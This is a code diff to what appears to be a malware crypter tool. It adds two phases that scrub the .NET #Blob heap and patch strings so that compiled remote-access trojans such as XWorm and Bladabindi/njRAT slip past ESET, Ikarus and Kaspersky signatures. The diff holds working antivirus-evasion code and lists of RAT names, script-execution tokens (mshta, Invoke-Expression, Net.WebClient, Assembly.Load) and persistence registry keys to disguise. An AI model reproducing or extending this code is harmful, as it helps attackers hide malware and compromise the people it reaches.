@@ -62,7 +62,7 @@ LAYER_META = [
     ("L12", "C/C++ STUB",  "Native C stub · XOR strings · 5 anti-debug vectors"),
     ("L13", "STR FLOOD",  "500K XOR-encrypted fake strings · 200 junk blocks · +15 MB inflate"),
     ("L14", "STR OBFUSC.", "ASCII + UTF-16 scan → XOR-cipher AV-pattern strings → signature bypass"),
-    ("L15", "MSIL STRIP",  "PDB · Rich hdr · timestamp · #GUID · #Strings · VersionInfo · script-token scrub"),
+    ("L15", "MSIL STRIP",  "PDB · Rich hdr · timestamp · #GUID · #Strings · #Blob · VersionInfo · 12-phase scrub"),
 ]
 
 
@@ -2041,6 +2041,10 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
             b"trojan", b"Trojan", b"TROJAN",
             b"malware", b"Malware", b"MALWARE",
             b"virus", b"Virus", b"VIRUS",
+            b"bladabindi", b"Bladabindi", b"BLADABINDI",
+            b"HWid", b"hwid", b"HWID",
+            b"RECYCLER", b"Recycler", b"recycler",
+            b"Policies", b"policies", b"POLICIES",
         }
         try:
             bsjb2 = bytes(working).find(b'BSJB')
@@ -2166,7 +2170,163 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self._ln(f"               ASCII: {ext_hits} · UTF-16LE: {ext_hits_u} extended token(s) patched", "g3")
         self._sleep(0.1)
 
-        num_phases = 10
+        # ── Ph11 : #Blob heap custom-attribute string scrub ──────────────────────
+        # Walks the BSJB #Blob stream, finds printable attribute value strings that
+        # contain known trigger words, and overwrites them with same-length random
+        # letters.  Disrupts ESET MSIL/XWorm.B and Ikarus Trojan.MSIL.Bladabindi
+        # assembly-attribute fingerprints stored as blob entries.
+        self._ln("        [Ph11] #Blob heap scrub...", "cy")
+        try:
+            bsjb3 = bytes(working).find(b'BSJB')
+            if bsjb3 != -1:
+                ver_len_off3  = bsjb3 + 4 + 2 + 2 + 4
+                ver_len3      = (struct.unpack_from("<I", working, ver_len_off3)[0] + 3) & ~3
+                streams_off3  = ver_len_off3 + 4 + ver_len3 + 2
+                num_str3      = struct.unpack_from("<H", working, streams_off3)[0]
+                streams_off3 += 2
+                blob_off3 = -1; blob_sz3 = -1
+                cur3 = streams_off3
+                for _ in range(num_str3):
+                    so3 = struct.unpack_from("<I", working, cur3)[0]
+                    ss3 = struct.unpack_from("<I", working, cur3 + 4)[0]
+                    ns3 = cur3 + 8
+                    ne3 = ns3
+                    while ne3 < len(working) and working[ne3] != 0: ne3 += 1
+                    sn3 = bytes(working[ns3:ne3])
+                    cur3 += 8 + ((ne3 - ns3 + 1 + 3) & ~3)
+                    if sn3 == b'#Blob':
+                        blob_off3 = bsjb3 + so3; blob_sz3 = ss3; break
+
+                BLOB_TRIGGERS = {
+                    b"xworm", b"XWorm", b"Xworm", b"XWORM",
+                    b"bladabindi", b"Bladabindi", b"BLADABINDI",
+                    b"asyncrat", b"AsyncRAT", b"njrat", b"njRAT",
+                    b"quasar", b"remcos", b"darkcomet", b"nanocore",
+                    b"keylog", b"stealer", b"dropper", b"inject",
+                    b"payload", b"trojan", b"malware", b"virus",
+                    b"ransom", b"rootkit", b"shellcode", b"bypass",
+                    b"HWid", b"hwid", b"HWID",
+                    b"Policies", b"policies",
+                    b"RECYCLER", b"Recycler", b"recycler",
+                    b"startup", b"persist", b"loader", b"hidden",
+                    b"silent", b"evasion", b"obfusc", b"theft",
+                }
+
+                blob_hits3 = 0
+                if blob_off3 != -1:
+                    pos3 = blob_off3
+                    end3 = blob_off3 + blob_sz3
+                    while pos3 < end3:
+                        b0 = working[pos3]
+                        if b0 == 0:
+                            pos3 += 1
+                            continue
+                        if b0 == 0xFF:
+                            pos3 += 1
+                            continue
+                        if b0 & 0x80 == 0:
+                            blen3 = b0; pos3 += 1
+                        elif b0 & 0xC0 == 0x80:
+                            if pos3 + 1 >= end3: break
+                            blen3 = ((b0 & 0x3F) << 8) | working[pos3 + 1]; pos3 += 2
+                        else:
+                            if pos3 + 3 >= end3: break
+                            blen3 = ((b0 & 0x1F) << 24) | (working[pos3+1] << 16) | (working[pos3+2] << 8) | working[pos3+3]; pos3 += 4
+                        if blen3 == 0 or blen3 > 256 or pos3 + blen3 > end3:
+                            pos3 += max(1, blen3) if blen3 > 0 else 1
+                            continue
+                        chunk3 = bytes(working[pos3:pos3 + blen3])
+                        if all(0x20 <= c < 0x7F for c in chunk3):
+                            chunk_low3 = chunk3.lower()
+                            for trig3 in BLOB_TRIGGERS:
+                                if trig3.lower() in chunk_low3:
+                                    new_blob3 = bytearray(
+                                        random.randint(0x61, 0x7A) for _ in range(blen3))
+                                    working[pos3:pos3 + blen3] = new_blob3
+                                    blob_hits3 += 1
+                                    break
+                        pos3 += blen3
+
+                hits += blob_hits3
+                self._ln(f"               {blob_hits3} #Blob attribute(s) containing trigger words patched", "g3")
+            else:
+                self._ln("               No BSJB — skipped", "g3")
+        except Exception:
+            self._ln("               parse error — skipped", "cy")
+        self._sleep(0.1)
+
+        # ── Ph12 : Bladabindi / Kaspersky extended token pass ────────────────────
+        # Adds Bladabindi-specific identifier replacements + more script invocation
+        # tokens.  Targets Ikarus Trojan.MSIL.Bladabindi and Kaspersky
+        # HEUR:Trojan.Script.Generic heuristics.
+        self._ln("        [Ph12] Bladabindi / Kaspersky extended pass...", "cy")
+        BLADE_TOKENS = [
+            (b"bladabindi",           b"xladaxindi"),
+            (b"Bladabindi",           b"XladaXindi"),
+            (b"BLADABINDI",           b"XLADAXINDI"),
+            (b"HWid",                 b"HZid"),
+            (b"hwid",                 b"hzid"),
+            (b"HWID",                 b"HZID"),
+            (b"wscript.exe",          b"wzcript.exe"),
+            (b"cscript.exe",          b"czcript.exe"),
+            (b"mshta.exe",            b"mzhta.exe"),
+            (b"mshta",                b"mzhta"),
+            (b"wscript",              b"wzcript"),
+            (b"cscript",              b"czcript"),
+            (b"Invoke-Expression",    b"Znvoke-Expression"),
+            (b"invoke-expression",    b"znvoke-expression"),
+            (b"IEX",                  b"ZEX"),
+            (b"iex ",                 b"zex "),
+            (b"Net.WebClient",        b"Net_WebClient"),
+            (b"net.webclient",        b"net_webclient"),
+            (b"HttpWebRequest",       b"HttpWebZequest"),
+            (b"Assembly.Load",        b"Assembly_Load"),
+            (b"assembly.load",        b"assembly_load"),
+            (b"Policies\\Explorer",   b"Policies_Explorer"),
+            (b"policies\\explorer",   b"policies_explorer"),
+            (b"RECYCLER",             b"XECYCLER"),
+            (b"Recycler",             b"Xecycler"),
+            (b"recycler",             b"xecycler"),
+            (b"HKCU\\Run",            b"HKCU_Run"),
+            (b"HKLM\\Run",            b"HKLM_Run"),
+            (b"DisableTaskMgr",       b"DisableTaskZgr"),
+            (b"disabletaskmgr",       b"disabletaskzgr"),
+        ]
+        BLADE_TOKENS = [(a, b) for a, b in BLADE_TOKENS if len(a) == len(b)]
+        cur_raw3 = bytes(working)
+        blade_hits = 0
+        for orig3, repl3 in BLADE_TOKENS:
+            pos3b = 0
+            while True:
+                idx3 = cur_raw3.find(orig3, pos3b)
+                if idx3 == -1:
+                    break
+                working[idx3:idx3 + len(orig3)] = repl3
+                blade_hits += 1
+                pos3b = idx3 + len(orig3)
+        cur_raw3 = bytes(working)
+
+        blade_hits_u = 0
+        for orig3, repl3 in BLADE_TOKENS:
+            orig3_u = orig3.decode("latin-1").encode("utf-16-le")
+            repl3_u = repl3.decode("latin-1").encode("utf-16-le")
+            if len(orig3_u) != len(repl3_u):
+                continue
+            pos3b = 0
+            while True:
+                idx3 = cur_raw3.find(orig3_u, pos3b)
+                if idx3 == -1:
+                    break
+                working[idx3:idx3 + len(orig3_u)] = bytearray(repl3_u)
+                blade_hits_u += 1
+                pos3b = idx3 + len(orig3_u)
+        cur_raw3 = bytes(working)
+
+        hits += blade_hits + blade_hits_u
+        self._ln(f"               ASCII: {blade_hits} · UTF-16LE: {blade_hits_u} Bladabindi/Kaspersky token(s) patched", "g3")
+        self._sleep(0.1)
+
+        num_phases = 12
         if hits:
             self._ln(f"\n        Result : ✓ {hits} field(s) / token(s) stripped across {num_phases} phases", "gn")
         else:
